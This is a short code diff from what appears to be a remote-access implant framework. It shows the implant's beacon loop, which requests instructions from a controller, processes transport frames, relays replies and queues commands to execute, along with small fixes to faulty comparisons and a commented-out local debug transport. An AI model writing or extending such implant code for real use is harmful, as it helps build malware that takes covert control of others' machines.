@@ -67,6 +67,7 @@ class Vzhivlyat(object):
 
 vzhivlyat = Vzhivlyat()
 transport_config = {"transport_id": vzhivlyat.component_id, "connect_addr": "127.0.0.1", "connect_port": 8084}
+# transport_config = {"transport_id": vzhivlyat.component_id, "transport_dir": "/Users/jechavarria/work/debug_dir/"}
 vzhivlyat.transport = yadro.import_transport_for_implant(vzhivlyat, transport_config)
 vzhivlyat.prepare_manifest()
 
@@ -78,12 +79,12 @@ while True:
         transport_frame = yadro.send_cmd_output(vzhivlyat)
         frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
     transport_frame = yadro.request_instructions(vzhivlyat)
-    if transport_frame is None or 0:
+    if transport_frame in [None, 0]:
         pass
     else:
         data = frame_orchestrator.process_transport_frame(vzhivlyat, transport_frame)
         del transport_frame
-        if data is not (0 or None):
+        if data not in [0, None]:
             yadro.relay_reply(vzhivlyat, data)
     # Check to see if we have commands to execute
     if len(vzhivlyat.cmd_queue) > 0:
